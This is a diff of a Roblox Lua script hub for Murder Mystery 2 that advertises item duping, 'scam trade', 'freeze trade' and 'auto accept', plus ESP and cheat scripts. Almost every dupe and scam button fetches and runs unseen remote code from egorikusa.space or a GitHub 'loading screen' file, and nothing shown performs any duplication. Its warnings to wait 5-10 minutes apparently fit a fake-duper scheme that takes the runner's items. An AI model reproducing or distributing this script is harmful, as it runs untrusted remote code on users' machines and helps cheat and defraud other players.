@@ -1,131 +1,295 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 
-local Window = Rayfield:CreateWindow({
-   Name = "MM2 DUPER & SCAM TRADE",
-   LoadingTitle = "Mm2 duper and scam trade",
-   LoadingSubtitle = "by dom_scriptsrblx",
-   ConfigurationSaving = {
-      Enabled = false,
-      FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "Example Hub"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-   KeySystem = false, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Key | Youtube Hub",
-      Subtitle = "Key System",
-      Note = "Key In Discord Server",
-      FileName = "YoutubeHubKey1", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"https://pastebin.com/raw/AtgzSPWK"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-   }
+local Window = Fluent:CreateWindow({
+    Title = "MM2 Hub 🔪🔥🔫 " .. Fluent.Version,
+    SubTitle = "by dom scripts",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
 })
 
-local MainTab = Window:CreateTab("Duper", nil) -- Title, Image
-local MainSection = MainTab:CreateSection("Main")
+--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
+local Tabs = {
+    Main = Window:AddTab({ Title = "dupe", Icon = "" }),
+    Main2 = Window:AddTab({ Title = "scam trade", Icon = "" }),
+    Main3 = Window:AddTab({ Title = "Fun while you wait", Icon = "" }),
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
 
-Rayfield:Notify({
-   Title = "after executing wait 5-10 mins after runing script",
-   Content = "by me!",
-   Duration = 6,
-   Image = 13047715178,
-   Actions = { -- Notification Buttons
-      Ignore = {
-         Name = "Okay!",
-         Callback = function()
-         print("The user tapped Okay!")
-      end
-   },
-},
-})
+local Options = Fluent.Options
 
-local Button = MainTab:CreateButton({
-   Name = "start duper system",
+do
+    Fluent:Notify({
+        Title = "WAIT!!",
+        Content = "WAIT 5-10 MINS SO YOU DONT LOOSE GODLYS",
+        SubContent = "SubContent", -- Optional
+        Duration = 5 -- Set to nil to make the notification not disappear
+    })
 
-   end,
-})
 
-local Button = MainTab:CreateButton({
-   Name = "dupe godlys",
-   Callback = function()
+
+    Tabs.Main:AddParagraph({
+        Title = "NOTE!",
+        Content = "Wait 5-10 mins or you can loose godlys.\nnot my problem if you do!"
+    })
+
+
+
+    Tabs.Main:AddButton({
+        Title = "Dupe activator!!",
+        Description = "starts the duper (REQUIRED)",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingMadeEZ/mm2DupeScriptEz/refs/heads/main/loading%20screen%20(ty%20arko!)"))();
+            Window:Dialog({
+                Title = "executed!",
+                Content = "now wait 5-10 mins",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
+
+    Tabs.Main:AddButton({
+        Title = "Dupe activate 2 !",
+        Description = "starts the duper (REQUIRED)",
+        Callback = function()
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
-   end,
-})
+            Window:Dialog({
+                Title = "executed!",
+                Content = "now wait 5-10 mins",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
 
-local DupeTab = Window:CreateTab("scam trade", nil) -- Title, Image
-local MainSection = DupeTab:CreateSection("Main")
-
-local Button = DupeTab:CreateButton({
-   Name = "Scam trade start",
-   Callback = function()
+    Tabs.Main:AddButton({
+        Title = "Duper!",
+        Description = "starts the duper (REQUIRED)",
+        Callback = function()
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
-   end,
-})
+            Window:Dialog({
+                Title = "executed!",
+                Content = "now wait 5-10 mins",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
 
-local Button = DupeTab:CreateButton({
-   Name = "freeze trade",
-   Callback = function()
+    Tabs.Main2:AddButton({
+        Title = "Activate scam trade 1(DO BEFORE TRADE!)",
+        Description = "DO IT BEFORE THE TRADE",
+        Callback = function()
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
-   end,
-})
+            Window:Dialog({
+                Title = "executed! PLEASE WAIT",
+                Content = "have fun! BUT WAIT!",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
+    Tabs.Main2:AddButton({
+        Title = "Activate scam trade 2(DO BEFORE TRADE!)",
+        Description = "DO IT BEFORE THE TRADE",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingMadeEZ/mm2DupeScriptEz/refs/heads/main/loading%20screen%20(ty%20arko!)"))();
+            Window:Dialog({
+                Title = "executed! PLEASE WAIT",
+                Content = "have fun! BUT WAIT!",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
 
-local Button = DupeTab:CreateButton({
-   Name = "force accept",
-   Callback = function()
+
+    local Toggle = Tabs.Main2:AddToggle("MyToggle", {Title = "Start scam trade 🔥", Default = false })
+
+    Toggle:OnChanged(function()
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
-   end,
-})
+        print("Toggle changed:", Options.MyToggle.Value)
+    end)
 
-local FunTab = Window:CreateTab("Fun while u wait", nil) -- Title, Image
-local MainSection = FunTab:CreateSection("Main")
+    Options.MyToggle:SetValue(false)
 
-local Slider = FunTab:CreateSlider({
-   Name = "WalkSpeed Slider",
-   Range = {1, 350},
-   Increment = 1,
-   Suffix = "Speed",
-   CurrentValue = 16,
-   Flag = "sliderws", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
-   end,
-})
+    local Toggle = Tabs.Main2:AddToggle("MyToggle", {Title = "Freeze trade 🧊", Default = false })
 
-local Slider = FunTab:CreateSlider({
-   Name = "JumpPower Slider",
-   Range = {1, 350},
-   Increment = 1,
-   Suffix = "Speed",
-   CurrentValue = 16,
-   Flag = "sliderjp", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
-   end,
-})
+    Toggle:OnChanged(function()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+        print("Toggle changed:", Options.MyToggle.Value)
+    end)
 
-local Button = FunTab:CreateButton({
-   Name = "infinte Yeild",
-   Callback = function()
+    Options.MyToggle:SetValue(false)
+
+    local Toggle = Tabs.Main2:AddToggle("MyToggle", {Title = "auto accept ✅", Default = false })
+
+    Toggle:OnChanged(function()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+        print("Toggle changed:", Options.MyToggle.Value)
+    end)
+
+    Options.MyToggle:SetValue(false)
+
+    Tabs.Main3:AddButton({
+        Title = "Infinite yeild",
+        Description = "Fun exploit script",
+        Callback = function()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-   end,
-})
+            Window:Dialog({
+                Title = "executed!",
+                Content = "have fun! please wait when using script!",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
 
-local Button = FunTab:CreateButton({
-   Name = "esp",
-   Callback = function()
+    Tabs.Main3:AddButton({
+        Title = "ESP",
+        Description = "ability to see all players and roles!",
+        Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
-   end,
+            Window:Dialog({
+                Title = "executed!",
+                Content = "have fun!",
+                Buttons = {
+                    {
+                        Title = "Confirm",
+                        Callback = function()
+                            print("Confirmed the dialog.")
+                        end
+                    },
+                    {
+                        Title = "Cancel",
+                        Callback = function()
+                            print("Cancelled the dialog.")
+                        end
+                    }
+                }
+            })
+        end
+    })
+
+
+
+
+
+
+
+
+
+
+-- Addons:
+-- SaveManager (Allows you to have a configuration system)
+-- InterfaceManager (Allows you to have a interface managment system)
+
+-- Hand the library over to our managers
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+
+-- Ignore keys that are used by ThemeManager.
+-- (we dont want configs to save themes, do we?)
+SaveManager:IgnoreThemeSettings()
+
+-- You can add indexes of elements the save manager should ignore
+SaveManager:SetIgnoreIndexes({})
+
+-- use case for doing it this way:
+-- a script hub could have themes in a global folder
+-- and game configs in a separate folder per game
+InterfaceManager:SetFolder("FluentScriptHub")
+SaveManager:SetFolder("FluentScriptHub/specific-game")
+
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+
+Window:SelectTab(1)
+
+Fluent:Notify({
+    Title = "WAIT",
+    Content = "BE CAREFUL WITH SCRIPT RISK OF GODLY LOSS",
+    Duration = 8
 })
 
-
-
-
-
-
-
-
+-- You can use the SaveManager:LoadAutoloadConfig() to load a config
+-- which has been marked to be one that auto loads!
+SaveManager:LoadAutoloadConfig()
